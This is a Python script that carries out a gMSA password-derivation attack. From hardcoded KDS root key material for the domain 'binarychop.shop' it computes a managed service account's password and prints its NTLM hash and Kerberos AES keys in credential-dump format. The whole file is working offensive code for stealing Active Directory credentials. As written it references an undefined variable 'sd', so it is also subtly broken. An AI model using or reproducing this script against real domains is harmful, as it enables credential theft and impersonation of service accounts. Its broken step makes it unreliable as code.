import base64
from binascii import hexlify
import dpapi
import uuid
from Cryptodome.Hash import MD4
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
from passlib.hash import lmhash

cn="9ce5680e72a1912a1fb6d6d72348451f"
msKds_KDFAlgorithmID ="SP800_108_CTR_HMAC"
msKds_KDFParam="00000000010000000e000000000000005300480041003500310032000000"
msKds_SecretAgreementAlgorithmID="DH"
msKds_SecretAgreementParam="0c0200004448504d0001000087a8e61db4b6663cffbbd19c651959998ceef608660dd0f25d2ceed4435e3b00e00df8f1d61957d4faf7df4561b2aa3016c3d91134096faa3bf4296d830e9a7c209e0c6497517abd5a8a9d306bcf67ed91f9e6725b4758c022e0b1ef4275bf7b6c5bfc11d45f9088b941f54eb1e59bb8bc39a0bf12307f5c4fdb70c581b23f76b63acae1caa6b7902d52526735488a0ef13c6d9a51bfa4ab3ad8347796524d8ef6a167b5a41825d967e144e5140564251ccacb83e6b486f6b3ca3f7971506026c0b857f689962856ded4010abd0be621c3a3960a54e710c375f26375d7014103a4b54330c198af126116d2276e11715f693877fad7ef09cadb094ae91e1a15973fb32c9b73134d0b2e77506660edbd484ca7b18f21ef205407f4793a1a0ba12510dbc15077be463fff4fed4aac0bb555be3a6c1b0c6b47b1bc3773bf7e8c6f62901228f8c28cbb18a55ae31341000a650196f931c77a57f2ddf463e5e9ec144b777de62aaab8a8628ac376d282d6ed3864e67982428ebc831d14348f6f2f9193b5045af2767164e1dfc967c1fb3f2e55a4bd1bffe83b9c80d052b985d182ea0adb2a3b7313d3fe14c8484b1e052588b9b7d2bbd2df016199ecd06e1557cd0915b3353bbb64e0ec377fd028370df92b52c7891428cdc67eb6184b523d1db246c32f63078490f00ef8d647d148d47954515e2327cfef98c582664b4c0f6cc41659"
msKds_PublicKeyLength=2048
msKds_PrivateKeyLength=512
msKds_RootKeyData="fb420d334a3e06df32ab4c7e30c53024a4cbae1f427c3d3ba5da6e639341abb92abb3def2de954d2c3904ccbdd3b5ab92a99180831f6487c2067eaee6d506d2f"
msKds_RootKeyDataSize=64
msKds_Version=1
msKds_Version2=1
msKds_DomainID="CN=DC,OU=Domain Controllers,DC=binarychop,DC=shop"
msKds_UseStartTime=133476356837505051
msKds_CreateTime=133476716837810000
rootKeySize=880
mpid = "AQAAAEtEU0sCAAAAagEAAAIAAAAQAAAAnOVoDnKhkSofttbXI0hFHwAAAAAgAAAAIAAAAGIAaQBuAGEAcgB5AGMAaABvAHAALgBzAGgAbwBwAAAAYgBpAG4AYQByAHkAYwBoAG8AcAAuAHMAaABvAHAAAAA="
sid_b64 = "AQUAAAAAAAUVAAAANtbe+UHlY5W82ZxnXwQAAA=="

rootKeyID = uuid.UUID(cn)

# store the KDS root key attributes in the KeyCache for future use
cache = dpapi.KeyCache()
cache.load_key(bytearray.fromhex(msKds_RootKeyData), 
               rootKeyID, version=1, kdf_algorithm=msKds_KDFAlgorithmID, 
               kdf_parameters=bytearray.fromhex(msKds_KDFParam),
               secret_algorithm="DH", secret_parameters=bytearray.fromhex(msKds_SecretAgreementParam),
               private_key_length=512, public_key_length=2048)

# static const BYTE gmsaSecurityDescriptor[] = {/* O:SYD:(A;;FRFW;;;S-1-5-9) */
# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68
gmsaSecurityDescriptor = bytes([0x1, 0x0, 0x4, 0x80, 0x30, 0x0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x14, 0x00, 0x00, 0x00, 0x02, 0x0, 0x1C, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x14, 0x0, 0x9F, 0x1, 0x12, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x9,
                0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x12, 0x0, 0x0, 0x0])

# generate the GKE from the KDS root key attributes, the hardcoded SD, and the rootKeyID
gke = dpapi.get_gke_from_cache(rootKeyID, sd, cache)


key_id = dpapi.KeyIdentifier.unpack(base64.b64decode(mpid))

# generate the gMSA password
gmsa_key = gke.get_gmsa_key(key_id, base64.b64decode(sid_b64))

domain = "binarychop.shop"
sam = "test$"

password = gmsa_key.decode('utf-16-le', 'replace').encode('utf-8')

# Compute lmhash:ntlm key
lmpass = lmhash.hash(password)
ntlm_hash = MD4.new ()
ntlm_hash.update (gmsa_key)
passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
userpass = sam + ':::' + lmpass + ":" + passwd
print(userpass)

# compute the AES keys
salt = '%shost%s.%s' % (domain.upper(), sam[:-1].lower(), domain.lower())
aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents)
aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents)
print('%s:aes256-cts-hmac-sha1-96:%s' % (sam, aes_256_hash.decode('utf-8')))
print('%s:aes128-cts-hmac-sha1-96:%s' % (sam, aes_128_hash.decode('utf-8')))
